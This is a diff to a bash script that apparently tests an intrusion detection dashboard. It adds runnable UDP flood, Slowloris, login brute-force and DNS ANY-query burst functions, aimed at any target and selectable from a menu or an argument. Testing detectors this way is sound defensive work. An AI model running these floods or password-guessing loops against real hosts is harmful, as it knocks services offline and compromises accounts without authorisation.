@@ -270,6 +270,176 @@ attack_stealth_scan() {
     echo ""
 }
 
+# Attack 8: UDP Flood (Detected as "dos")
+attack_udp_flood() {
+    echo ""
+    echo "=========================================="
+    echo "ATTACK 8: UDP Flood (Should trigger 'dos' detection)"
+    echo "=========================================="
+    echo "Sending UDP packets to $TARGET..."
+    echo "This should be detected as DoS attack"
+    echo ""
+    
+    if command -v hping3 >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
+        echo "Using hping3 UDP flood..."
+        timeout 30 sudo hping3 --udp -p 53 --flood $TARGET 2>/dev/null || true
+    else
+        echo "Using Python UDP flood..."
+        python3 << EOF
+import socket
+import time
+
+target = "$TARGET"
+port = 53
+duration = 30
+count = 0
+
+print(f"Sending UDP packets to {target}:{port}...")
+start_time = time.time()
+
+try:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while time.time() - start_time < duration:
+        try:
+            sock.sendto(b'UDP FLOOD', (target, port))
+            count += 1
+            if count % 100 == 0:
+                print(f"  Sent {count} UDP packets...")
+        except:
+            pass
+        time.sleep(0.01)
+    sock.close()
+except KeyboardInterrupt:
+    pass
+
+print(f"\\n✅ UDP flood complete. Sent {count} packets.")
+EOF
+    fi
+    
+    echo ""
+    echo "✅ UDP flood complete. Check IDS dashboard for 'dos' detection."
+    echo ""
+}
+
+# Attack 9: Slowloris (Detected as "dos")
+attack_slowloris() {
+    echo ""
+    echo "=========================================="
+    echo "ATTACK 9: Slowloris (Should trigger 'dos' detection)"
+    echo "=========================================="
+    echo "Opening slow HTTP connections to $TARGET:$PORT..."
+    echo "This should be detected as DoS attack"
+    echo ""
+    
+    if command -v python3 >/dev/null 2>&1; then
+        python3 << EOF
+import socket
+import time
+import threading
+
+target = "$TARGET"
+port = $PORT
+sockets = []
+
+def create_slow_connection(i):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(4)
+        s.connect((target, port))
+        s.send(f"GET /?{i} HTTP/1.1\\r\\n".encode())
+        s.send(f"Host: {target}\\r\\n".encode())
+        s.send("User-Agent: Mozilla/5.0\\r\\n".encode())
+        sockets.append(s)
+        print(f"  Connection {i} established")
+    except:
+        pass
+
+print("Creating 200 slow connections...")
+threads = []
+for i in range(200):
+    t = threading.Thread(target=create_slow_connection, args=(i,))
+    t.start()
+    threads.append(t)
+    time.sleep(0.1)
+
+print(f"\\n✅ Slowloris started. Keeping {len(sockets)} connections open for 30 seconds...")
+time.sleep(30)
+
+for s in sockets:
+    try:
+        s.close()
+    except:
+        pass
+
+print("✅ Slowloris complete.")
+EOF
+    else
+        echo "Python3 required for Slowloris attack"
+    fi
+    
+    echo ""
+    echo "✅ Slowloris complete. Check IDS dashboard for 'dos' detection."
+    echo ""
+}
+
+# Attack 10: Brute Force Simulation (Detected as "brute_force" or "r2l")
+attack_brute_force() {
+    echo ""
+    echo "=========================================="
+    echo "ATTACK 10: Brute Force (Should trigger 'brute_force' detection)"
+    echo "=========================================="
+    echo "Simulating login attempts to $TARGET:$PORT..."
+    echo "This should be detected as brute force attack"
+    echo ""
+    
+    if command -v curl >/dev/null 2>&1; then
+        common_passwords=("admin" "password" "123456" "root" "test" "admin123" "password123")
+        for i in {1..300}; do
+            pwd=${common_passwords[$((i % ${#common_passwords[@]}))]}
+            curl -s -m 1 -X POST http://$TARGET:$PORT/api/auth/login \
+                -H "Content-Type: application/json" \
+                -d "{\"email\":\"admin@test.com\",\"password\":\"$pwd\"}" >/dev/null 2>&1 &
+            if [ $((i % 50)) -eq 0 ]; then
+                echo "  Attempted $i logins..."
+            fi
+        done
+        wait
+    else
+        echo "curl required for brute force attack"
+    fi
+    
+    echo ""
+    echo "✅ Brute force complete. Check IDS dashboard for 'brute_force' detection."
+    echo ""
+}
+
+# Attack 11: DNS Amplification (Detected as "dos")
+attack_dns_amplification() {
+    echo ""
+    echo "=========================================="
+    echo "ATTACK 11: DNS Amplification (Should trigger 'dos' detection)"
+    echo "=========================================="
+    echo "Sending DNS queries to $TARGET..."
+    echo "This should be detected as DoS attack"
+    echo ""
+    
+    if command -v dig >/dev/null 2>&1; then
+        for i in {1..500}; do
+            dig @$TARGET google.com ANY >/dev/null 2>&1 &
+            if [ $((i % 100)) -eq 0 ]; then
+                echo "  Sent $i DNS queries..."
+            fi
+        done
+        wait
+    else
+        echo "dig required for DNS amplification attack"
+    fi
+    
+    echo ""
+    echo "✅ DNS amplification complete. Check IDS dashboard for 'dos' detection."
+    echo ""
+}
+
 # Main menu
 show_menu() {
     echo ""
@@ -281,10 +451,14 @@ show_menu() {
     echo "  5) Rapid Port Scan (port_scan detection)"
     echo "  6) Mixed Attack (multiple detections)"
     echo "  7) Stealth Port Scan (port_scan detection)"
-    echo "  8) Run ALL attacks sequentially"
-    echo "  9) Exit"
+    echo "  8) UDP Flood (dos detection)"
+    echo "  9) Slowloris (dos detection)"
+    echo " 10) Brute Force (brute_force detection)"
+    echo " 11) DNS Amplification (dos detection)"
+    echo " 12) Run ALL attacks sequentially"
+    echo " 13) Exit"
     echo ""
-    read -p "Enter choice [1-9]: " choice
+    read -p "Enter choice [1-13]: " choice
     
     case $choice in
         1) attack_port_scan ;;
@@ -294,7 +468,11 @@ show_menu() {
         5) attack_rapid_scan ;;
         6) attack_mixed ;;
         7) attack_stealth_scan ;;
-        8) 
+        8) attack_udp_flood ;;
+        9) attack_slowloris ;;
+        10) attack_brute_force ;;
+        11) attack_dns_amplification ;;
+        12) 
             attack_port_scan
             sleep 5
             attack_syn_flood
@@ -305,14 +483,20 @@ show_menu() {
             sleep 5
             attack_rapid_scan
             sleep 5
-            attack_mixed
+            attack_udp_flood
+            sleep 5
+            attack_slowloris
+            sleep 5
+            attack_brute_force
+            sleep 5
+            attack_dns_amplification
             echo ""
             echo "=========================================="
             echo "✅ All attacks completed!"
             echo "Check your IDS dashboard for all detections."
             echo "=========================================="
             ;;
-        9) echo "Exiting..."; exit 0 ;;
+        13) echo "Exiting..."; exit 0 ;;
         *) echo "Invalid choice. Try again."; show_menu ;;
     esac
 }
@@ -332,6 +516,10 @@ if [ "$3" != "" ]; then
         rapid) attack_rapid_scan ;;
         mixed) attack_mixed ;;
         stealth) attack_stealth_scan ;;
+        udp) attack_udp_flood ;;
+        slowloris) attack_slowloris ;;
+        brute) attack_brute_force ;;
+        dns) attack_dns_amplification ;;
         all)
             attack_port_scan
             sleep 5
@@ -343,7 +531,13 @@ if [ "$3" != "" ]; then
             sleep 5
             attack_rapid_scan
             sleep 5
-            attack_mixed
+            attack_udp_flood
+            sleep 5
+            attack_slowloris
+            sleep 5
+            attack_brute_force
+            sleep 5
+            attack_dns_amplification
             ;;
         *) echo "Unknown attack type: $3"; exit 1 ;;
     esac
